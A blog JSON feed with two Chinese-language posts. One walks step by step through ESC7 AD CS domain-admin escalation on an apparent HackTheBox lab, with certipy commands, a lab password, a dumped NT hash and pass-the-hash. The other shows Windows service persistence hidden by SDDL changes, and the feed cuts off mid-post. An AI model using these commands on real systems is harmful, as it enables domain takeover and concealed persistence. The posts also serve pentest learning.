{
    "version": "https://jsonfeed.org/version/1",
    "title": "竹林寺",
    "description": "请我喝咖啡！ψ(｀∇´)ψ",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2024/01/24/tools/%E5%9F%9F%E7%94%A8%E6%88%B7%E8%AF%81%E4%B9%A6%E9%85%8D%E7%BD%AE%E6%8F%90%E6%9D%83/",
            "url": "http://example.com/2024/01/24/tools/%E5%9F%9F%E7%94%A8%E6%88%B7%E8%AF%81%E4%B9%A6%E9%85%8D%E7%BD%AE%E6%8F%90%E6%9D%83/",
            "title": "域控提权/域用户证书配置提权/ESC7",
            "date_published": "2024-01-23T17:20:34.000Z",
            "content_html": "<h2 id=\"一使用场景\"><a class=\"anchor\" href=\"#一使用场景\">#</a> 一。使用场景：</h2>\n<h3 id=\"11需要有证书服务器adcs配置错误的域用户密码或hash\"><a class=\"anchor\" href=\"#11需要有证书服务器adcs配置错误的域用户密码或hash\">#</a> 1.1 需要有证书服务器 (ADCS)&amp; 配置错误的域用户密码或 hash</h3>\n<h2 id=\"二使用步骤\"><a class=\"anchor\" href=\"#二使用步骤\">#</a> 二。使用步骤：</h2>\n<blockquote>\n<p>(看使用步骤前，建议先看步骤三注意与踩坑)</p>\n</blockquote>\n<h3 id=\"21查看域用户配置\"><a class=\"anchor\" href=\"#21查看域用户配置\">#</a> 2.1. 查看域用户配置</h3>\n<p><strong>拿到域用户的 hash 或密码后，用 <code>certipy</code>  工具远程读取用户证书配置是否存在配置错误，如果有错误会显示漏洞存在且打出漏洞名称：</strong></p>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">certipy.exe find -u <span class=\"string\">&#x27;raven@manager.htb&#x27;</span> -p <span class=\"string\">&#x27;R4v3nBe5tD3veloP3r!123&#x27;</span> -dc-ip 10.10.11.236 -vulnerable -stdout</span><br></pre></td></tr></table></figure></p>\n<p>​\t\t<strong>执行结果如下：</strong></p>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PS D:\\miniconda\\Scripts&gt; certipy.exe find -u <span class=\"string\">&#x27;raven@manager.htb&#x27;</span> -p <span class=\"string\">&#x27;R4v3nBe5tD3veloP3r!123&#x27;</span> -dc-ip 10.10.11.236 -vulnerable -stdout</span><br><span class=\"line\">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Finding certificate templates</span><br><span class=\"line\">[*] Found 33 certificate templates</span><br><span class=\"line\">[*] Finding certificate authorities</span><br><span class=\"line\">[*] Found 1 certificate authority</span><br><span class=\"line\">[*] Found 11 enabled certificate templates</span><br><span class=\"line\">[*] Trying to get CA configuration <span class=\"keyword\">for</span> <span class=\"string\">&#x27;manager-DC01-CA&#x27;</span> via CSRA</span><br><span class=\"line\">[*] Got CA configuration <span class=\"keyword\">for</span> <span class=\"string\">&#x27;manager-DC01-CA&#x27;</span></span><br><span class=\"line\">[*] Enumeration output:</span><br><span class=\"line\">Certificate Authorities</span><br><span class=\"line\">  0</span><br><span class=\"line\">    CA Name                             : manager-DC01-CA</span><br><span class=\"line\">    DNS Name                            : dc01.manager.htb</span><br><span class=\"line\">    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb</span><br><span class=\"line\">    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB</span><br><span class=\"line\">    Certificate Validity Start          : 2023-07-27 10:21:05+00:00</span><br><span class=\"line\">    Certificate Validity End            : 2122-07-27 10:31:04+00:00</span><br><span class=\"line\">    Web Enrollment                      : Disabled</span><br><span class=\"line\">    User Specified SAN                  : Disabled</span><br><span class=\"line\">    Request Disposition                 : Issue</span><br><span class=\"line\">    Enforce Encryption <span class=\"keyword\">for</span> Requests     : Enabled</span><br><span class=\"line\">    Permissions</span><br><span class=\"line\">      Owner                             : MANAGER.HTB\\Administrators</span><br><span class=\"line\">      Access Rights</span><br><span class=\"line\">        Enroll                          : MANAGER.HTB\\Operator</span><br><span class=\"line\">                                          MANAGER.HTB\\Authenticated Users</span><br><span class=\"line\">                                          MANAGER.HTB\\Raven</span><br><span class=\"line\">        ManageCertificates              : MANAGER.HTB\\Administrators</span><br><span class=\"line\">                                          MANAGER.HTB\\Domain Admins</span><br><span class=\"line\">                                          MANAGER.HTB\\Enterprise Admins</span><br><span class=\"line\">        ManageCa                        : MANAGER.HTB\\Administrators</span><br><span class=\"line\">                                          MANAGER.HTB\\Domain Admins</span><br><span class=\"line\">                                          MANAGER.HTB\\Enterprise Admins</span><br><span class=\"line\">                                          MANAGER.HTB\\Raven</span><br><span class=\"line\">    [!] Vulnerabilities</span><br><span class=\"line\">      ESC7                              : <span class=\"string\">&#x27;MANAGER.HTB\\\\Raven&#x27;</span> has dangerous permissions</span><br><span class=\"line\">Certificate Templates                   : [!] Could not find any certificate templates</span><br><span class=\"line\">PS D:\\miniconda\\Scripts&gt;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"22-拿到对应漏洞esc7进一步远程攻击\"><a class=\"anchor\" href=\"#22-拿到对应漏洞esc7进一步远程攻击\">#</a> 2.2 拿到对应漏洞 (ESC7) 进一步远程攻击</h3>\n<h4 id=\"221创建证书\"><a class=\"anchor\" href=\"#221创建证书\">#</a> 2.2.1. 创建证书</h4>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">certipy.exe ca -ca <span class=\"string\">&#x27;manager-DC01-CA&#x27;</span> -add-officer raven -username raven@manager.htb -password <span class=\"string\">&#x27;R4v3nBe5tD3veloP3r!123&#x27;</span> -dc-ip 10.10.11.236<span class=\"string\">&#x27;</span></span><br></pre></td></tr></table></figure></p>\n<p>​\t\t\t\t<strong>执行结果如下：</strong></p>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PS D:\\miniconda\\Scripts&gt; .\\certipy.exe ca -ca <span class=\"string\">&#x27;manager-DC01-CA&#x27;</span> -add-officer raven -username raven@manager.htb -password <span class=\"string\">&#x27;R4v3nBe5tD3veloP3r!123&#x27;</span> -dc-ip 10.10.11.236</span><br><span class=\"line\">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Successfully added officer <span class=\"string\">&#x27;Raven&#x27;</span> on <span class=\"string\">&#x27;manager-DC01-CA&#x27;</span></span><br><span class=\"line\">PS D:\\miniconda\\Scripts&gt;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"222启用证书模板\"><a class=\"anchor\" href=\"#222启用证书模板\">#</a> 2.2.2. 启用证书模板</h4>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">certipy.exe ca -ca <span class=\"string\">&#x27;manager-DC01-CA&#x27;</span> -enable-template SubCA -username raven@manager.htb -password <span class=\"string\">&#x27;R4v3nBe5tD3veloP3r!123&#x27;</span> -dc-ip 10.10.11.236<span class=\"string\">&#x27;</span></span><br></pre></td></tr></table></figure></p>\n<p>​\t\t\t\t<strong>执行结果如下:</strong></p>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PS D:\\miniconda\\Scripts&gt; .\\certipy.exe ca -ca <span class=\"string\">&#x27;manager-DC01-CA&#x27;</span> -enable-template SubCA -username raven@manager.htb -password <span class=\"string\">&#x27;R4v3nBe5tD3veloP3r!123&#x27;</span> -dc-ip 10.10.11.236</span><br><span class=\"line\">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Successfully enabled <span class=\"string\">&#x27;SubCA&#x27;</span> on <span class=\"string\">&#x27;manager-DC01-CA&#x27;</span></span><br><span class=\"line\">PS D:\\miniconda\\Scripts&gt;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"223请求证书但是会被拒绝拒绝后保存私钥和请求id\"><a class=\"anchor\" href=\"#223请求证书但是会被拒绝拒绝后保存私钥和请求id\">#</a> 2.2.3. 请求证书，但是会被拒绝，拒绝后保存私钥和请求 ID</h4>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">certipy.exe req -username raven@manager.htb -password <span class=\"string\">&#x27;R4v3nBe5tD3veloP3r!123&#x27;</span> -ca <span class=\"string\">&#x27;manager-DC01-CA&#x27;</span> -target manager.htb -template SubCA -upn administrator@manager.htb -dc-ip 10.10.11.236</span><br></pre></td></tr></table></figure></p>\n<p>​\t\t\t\t<strong>执行结果如下:</strong></p>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PS D:\\miniconda\\Scripts&gt; certipy req -username raven@manager.htb -password <span class=\"string\">&#x27;R4v3nBe5tD3veloP3r!123&#x27;</span> -ca <span class=\"string\">&#x27;manager-DC01-CA&#x27;</span> -target manager.htb -template SubCA -upn administrator@manager.htb -dc-ip 10.10.11.236</span><br><span class=\"line\">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Requesting certificate via RPC</span><br><span class=\"line\">[-] Got error <span class=\"keyword\">while</span> trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template <span class=\"keyword\">do</span> not allow the current user to enroll <span class=\"keyword\">for</span> this <span class=\"built_in\">type</span> of certificate.</span><br><span class=\"line\">[*] Request ID is 26</span><br><span class=\"line\">Would you like to save the private key? (y/N) y</span><br><span class=\"line\">[*] Saved private key to 26.key</span><br><span class=\"line\">[-] Failed to request certificate</span><br><span class=\"line\">PS D:\\miniconda\\Scripts&gt;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"224签发和批准证书\"><a class=\"anchor\" href=\"#224签发和批准证书\">#</a> 2.2.4. 签发和批准证书</h4>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">certipy.exe ca -ca <span class=\"string\">&#x27;manager-DC01-CA&#x27;</span> -issue-request 26 -username raven@manager.htb -password <span class=\"string\">&#x27;R4v3nBe5tD3veloP3r!123&#x27;</span> -dc-ip 10.10.11.236</span><br></pre></td></tr></table></figure></p>\n<p>​\t\t\t\t<strong>执行结果如下:</strong></p>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PS D:\\miniconda\\Scripts&gt; .\\certipy.exe ca -ca <span class=\"string\">&#x27;manager-DC01-CA&#x27;</span> -issue-request 26 -username raven@manager.htb -password <span class=\"string\">&#x27;R4v3nBe5tD3veloP3r!123&#x27;</span> -dc-ip 10.10.11.236</span><br><span class=\"line\">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Successfully issued certificate</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"225请求签发的证书id下载对应证书凭证文件administratorpfx\"><a class=\"anchor\" href=\"#225请求签发的证书id下载对应证书凭证文件administratorpfx\">#</a> 2.2.5. 请求签发的证书 ID，下载对应证书凭证文件 (administrator.pfx)</h4>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">certipy req -username raven@manager.htb -password <span class=\"string\">&#x27;R4v3nBe5tD3veloP3r!123&#x27;</span> -ca <span class=\"string\">&#x27;manager-DC01-CA&#x27;</span> -target manager.htb -retrieve 26 -dc-ip 10.10.11.236</span><br></pre></td></tr></table></figure></p>\n<p>​\t\t\t\t<strong>执行结果如下:</strong></p>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PS D:\\miniconda\\Scripts&gt; certipy req -username raven@manager.htb -password <span class=\"string\">&#x27;R4v3nBe5tD3veloP3r!123&#x27;</span> -ca <span class=\"string\">&#x27;manager-DC01-CA&#x27;</span> -target manager.htb -retrieve 26 -dc-ip 10.10.11.236</span><br><span class=\"line\">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Rerieving certificate with ID 26</span><br><span class=\"line\">[*] Successfully retrieved certificate</span><br><span class=\"line\">[*] Got certificate with UPN <span class=\"string\">&#x27;administrator@manager.htb&#x27;</span></span><br><span class=\"line\">[*] Certificate has no object SID</span><br><span class=\"line\">[*] Loaded private key from <span class=\"string\">&#x27;26.key&#x27;</span></span><br><span class=\"line\">[*] Saved certificate and private key to <span class=\"string\">&#x27;administrator.pfx&#x27;</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"23导出hashpth横向\"><a class=\"anchor\" href=\"#23导出hashpth横向\">#</a> 2.3. 导出 hash，pth 横向</h3>\n<h4 id=\"231与域控时间同步不然无法登录\"><a class=\"anchor\" href=\"#231与域控时间同步不然无法登录\">#</a> 2.3.1. 与域控时间同步，不然无法登录</h4>\n<p><strong>linux 同步命令：</strong></p>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo ntpdate -s 10.10.11.236 <span class=\"comment\">#ip为域控ip</span></span><br></pre></td></tr></table></figure></p>\n<p><strong>win 同步命令：</strong></p>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sc start w32time <span class=\"comment\">#启动服务</span></span><br><span class=\"line\">w32tm /config /manualpeerlist:<span class=\"string\">&quot;10.129.102.122&quot;</span> /syncfromflags:manual /reliable:YES /update <span class=\"comment\">#同步域控时间，ip为域控ip</span></span><br></pre></td></tr></table></figure></p>\n<h4 id=\"232通过下载好的证书认证文件dump域管hash\"><a class=\"anchor\" href=\"#232通过下载好的证书认证文件dump域管hash\">#</a> 2.3.2. 通过下载好的证书认证文件 dump 域管 hash</h4>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">certipy auth -pfx <span class=\"string\">&#x27;administrator.pfx&#x27;</span> -username <span class=\"string\">&#x27;administrator&#x27;</span> -domain <span class=\"string\">&#x27;manager.htb&#x27;</span> -dc-ip 10.10.11.236</span><br></pre></td></tr></table></figure></p>\n<p><strong>执行结果如下：</strong></p>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PS D:\\miniconda\\Scripts&gt; certipy auth -pfx <span class=\"string\">&#x27;administrator.pfx&#x27;</span> -username <span class=\"string\">&#x27;administrator&#x27;</span> -domain <span class=\"string\">&#x27;manager.htb&#x27;</span> -dc-ip 10.10.11.236</span><br><span class=\"line\">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Using principal: administrator@manager.htb</span><br><span class=\"line\">[*] Trying to get TGT...</span><br><span class=\"line\">[*] Got TGT</span><br><span class=\"line\">[*] Saved credential cache to <span class=\"string\">&#x27;administrator.ccache&#x27;</span></span><br><span class=\"line\">[*] Trying to retrieve NT <span class=\"built_in\">hash</span> <span class=\"keyword\">for</span> <span class=\"string\">&#x27;administrator&#x27;</span></span><br><span class=\"line\">[*] Got <span class=\"built_in\">hash</span> <span class=\"keyword\">for</span> <span class=\"string\">&#x27;administrator@manager.htb&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"233pthhash横向拿下域控\"><a class=\"anchor\" href=\"#233pthhash横向拿下域控\">#</a> 2.3.3.pth/hash 横向拿下域控</h4>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nxc.exe wmi 10.10.11.236 -u administrator -H ae5064c2f62317332c88629e025924ef -x <span class=\"string\">&#x27;whoami&#x27;</span></span><br></pre></td></tr></table></figure></p>\n<p><strong>执行结果如下：</strong></p>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PS E:\\渗透工具\\提权+内网\\密码喷洒&gt; .\\nxc.exe wmi 10.10.11.236 -u administrator -H ae5064c2f62317332c88629e025924ef -x <span class=\"string\">&#x27;whoami&#x27;</span></span><br><span class=\"line\">RPC         10.10.11.236    135    DC01             [*] Windows NT 10.0 Build 17763 (name:DC01) (domain:manager.htb)</span><br><span class=\"line\">WMI         10.10.11.236    135    DC01             [+] manager.htb\\administrator:ae5064c2f62317332c88629e025924ef (Pwn3d!)</span><br><span class=\"line\">WMI         10.10.11.236    135    DC01             [+] Executed <span class=\"built_in\">command</span>: <span class=\"string\">&quot;whoami&quot;</span> via wmiexec</span><br><span class=\"line\">WMI         10.10.11.236    135    DC01             manager\\administrator</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"三注意与踩坑\"><a class=\"anchor\" href=\"#三注意与踩坑\">#</a> 三。注意与踩坑</h2>\n<h3 id=\"1221创建证书处\"><a class=\"anchor\" href=\"#1221创建证书处\">#</a> 1. <code>2.2.1.创建证书</code> 处：</h3>\n<p><strong>ca 名称（-ca 'manager-DC01-CA'），需要从 <code>2.1.查看域用户配置</code> ，响应结果中的 ca name 中拿到</strong></p>\n<h3 id=\"2224签发和批准证书处\"><a class=\"anchor\" href=\"#2224签发和批准证书处\">#</a> 2. <code>2.2.4.签发和批准证书</code> 处：</h3>\n<p><strong>请求的证书 id（-issue-request 26），需要从 <code>2.2.3.请求证书</code> ，响应结果中拿到</strong></p>\n<h3 id=\"3时间同步\"><a class=\"anchor\" href=\"#3时间同步\">#</a> 3. 时间同步</h3>\n<p><strong>必须与域控时间同步，不然无法登录（ <code>2.3.1.与域控时间同步</code> ）</strong></p>\n<p><strong>番外：</strong></p>\n<p><strong>Certipy 命令</strong></p>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Certipy v4.0.0 - by Oliver Lyak (ly4k)</span><br><span class=\"line\"></span><br><span class=\"line\">usage: certipy shadow [-h] [-account target account] [-device-id DEVICE_ID] [-debug] [-out output file name] [-scheme ldap scheme] [-dc-ip ip address] [-target-ip ip address] [-target dns/ip address] [-ns nameserver] [-dns-tcp] [-<span class=\"built_in\">timeout</span> seconds] [-u username@domain]</span><br><span class=\"line\">                      [-p password] [-hashes [LMHASH:]NTHASH] [-k] [-sspi] [-aes hex key] [-no-pass]</span><br><span class=\"line\">                      &#123;list,add,remove,clear,info,auto&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">positional arguments:</span><br><span class=\"line\">  &#123;list,add,remove,clear,info,auto&#125;</span><br><span class=\"line\">                        Key Credentials action</span><br><span class=\"line\"></span><br><span class=\"line\">optional arguments:</span><br><span class=\"line\">  -h, --<span class=\"built_in\">help</span>            show this <span class=\"built_in\">help</span> message and <span class=\"built_in\">exit</span></span><br><span class=\"line\">  -account target account</span><br><span class=\"line\">                        Account to target. If omitted, the user specified <span class=\"keyword\">in</span> the target will be used</span><br><span class=\"line\">  -device-id DEVICE_ID  Device ID of the Key Credential Link</span><br><span class=\"line\">  -debug                Turn debug output on</span><br><span class=\"line\"></span><br><span class=\"line\">output options:</span><br><span class=\"line\">  -out output file name</span><br><span class=\"line\"></span><br><span class=\"line\">connection options:</span><br><span class=\"line\">  -scheme ldap scheme</span><br><span class=\"line\">  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified <span class=\"keyword\">in</span> the target parameter</span><br><span class=\"line\">  -target-ip ip address</span><br><span class=\"line\">                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it</span><br><span class=\"line\">  -target dns/ip address</span><br><span class=\"line\">                        DNS Name or IP Address of the target machine. Required <span class=\"keyword\">for</span> Kerberos or SSPI authentication</span><br><span class=\"line\">  -ns nameserver        Nameserver <span class=\"keyword\">for</span> DNS resolution</span><br><span class=\"line\">  -dns-tcp              Use TCP instead of UDP <span class=\"keyword\">for</span> DNS queries</span><br><span class=\"line\">  -<span class=\"built_in\">timeout</span> seconds      Timeout <span class=\"keyword\">for</span> connections</span><br><span class=\"line\"></span><br><span class=\"line\">authentication options:</span><br><span class=\"line\">  -u username@domain, -username username@domain</span><br><span class=\"line\">                        Username. Format: username@domain</span><br><span class=\"line\">  -p password, -password password</span><br><span class=\"line\">                        Password</span><br><span class=\"line\">  -hashes [LMHASH:]NTHASH</span><br><span class=\"line\">                        NTLM <span class=\"built_in\">hash</span>, format is [LMHASH:]NTHASH</span><br><span class=\"line\">  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified <span class=\"keyword\">in</span> the <span class=\"built_in\">command</span> line</span><br><span class=\"line\">  -sspi                 Use Windows Integrated Authentication (SSPI)</span><br><span class=\"line\">  -aes hex key          AES key to use <span class=\"keyword\">for</span> Kerberos Authentication (128 or 256 bits)</span><br><span class=\"line\">  -no-pass              Don<span class=\"string\">&#x27;t ask for password (useful for -k and -sspi)</span></span><br></pre></td></tr></table></figure></p>\n",
            "tags": [
                "域控提权"
            ]
        },
        {
            "id": "http://example.com/2024/01/22/comm/%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/",
            "url": "http://example.com/2024/01/22/comm/%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/",
            "title": "win权限维持/安全描述符权限维持",
            "date_published": "2024-01-21T16:30:34.000Z",
            "content_html": "<p><strong>竹林寺</strong></p>\n<p><strong>cmd powershell 二选一</strong></p>\n<h2 id=\"1cmd创建自启动服务\"><a class=\"anchor\" href=\"#1cmd创建自启动服务\">#</a> 1.cmd 创建自启动服务</h2>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sc create <span class=\"string\">&quot;.NET CLR Networking 3.5.0.0&quot;</span> binpath= <span class=\"string\">&quot;cmd.exe /k C:\\test.txt&quot;</span> depend= Tcpip obj= Localsystem start= auto  </span><br></pre></td></tr></table></figure></p>\n<h2 id=\"2-powershell创建自启动服务\"><a class=\"anchor\" href=\"#2-powershell创建自启动服务\">#</a> 2. powershell 创建自启动服务</h2>\n<p><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">new-service</span> –Name <span class=\"string\">&quot;.NET CLR Networking 3.5.0.0&quot;</span> –DisplayName <span class=\"string\">&quot;.NET CLR Networking 3.5.0.0&quot;</span> –BinaryPathName <span class=\"string\">&quot;cmd.exe /k C:\\test.txt&quot;</span> – StartupType AutomaticDelayedStart  </span><br><span class=\"line\"><span class=\"built_in\">new-service</span> –Name <span class=\"string\">&quot;.NET CLR Networking 3.5.0.0&quot;</span> –DisplayName <span class=\"string\">&quot;.NET CLR Networking 3.5.0.0&quot;</span> –BinaryPathName <span class=\"string\">&quot;cmd.exe /k C:\\test.txt&quot;</span> –StartupType AutomaticDelayedStart</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"3-通过修改sddl安全描述符隐藏服务\"><a class=\"anchor\" href=\"#3-通过修改sddl安全描述符隐藏服务\">#</a> 3. 通过修改 SDDL (安全描述符) 隐藏服务</h2>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sc sdset <span class=\"string\">&quot;.NET CLR Networking 3.5.0.0&quot;</span> <span class=\"string\">&quot;D:(D;;DCLCWPDTSD;;;IU) (D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU) (A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY) (A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;</span>  </span><br></pre></td></tr></table></figure></p>\n<h2 id=\"4-然后通过sc与get-server查找服务均无结果\"><a class=\"anchor\" href=\"#4-然后通过sc与get-server查找服务均无结果\">#</a> 4. 然后通过 sc 与 get-server 查找服务均无结果：</h2>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> sc query |findstr <span class=\"string\">&quot;.NET CLR Networking 3.5.0.0&quot;</span> </span><br><span class=\"line\">get-service | findstr <span class=\"string\">&quot;.NET CLR Networking 3.5.0.0&quot;</span></span><br></pre></td></tr></table></figure><br />\n<img data-src=\"%5Cassets%5Cimage.png\" alt=\"image\" /></p>\n<h2 id=\"5-但这样做有一个问题在注册表中很容易看到异常value\"><a class=\"anchor\" href=\"#5-但这样做有一个问题在注册表中很容易看到异常value\">#</a> 5. 但这样做有一个问题：在注册表中很容易看到异常 value。</h2>\n<p><img 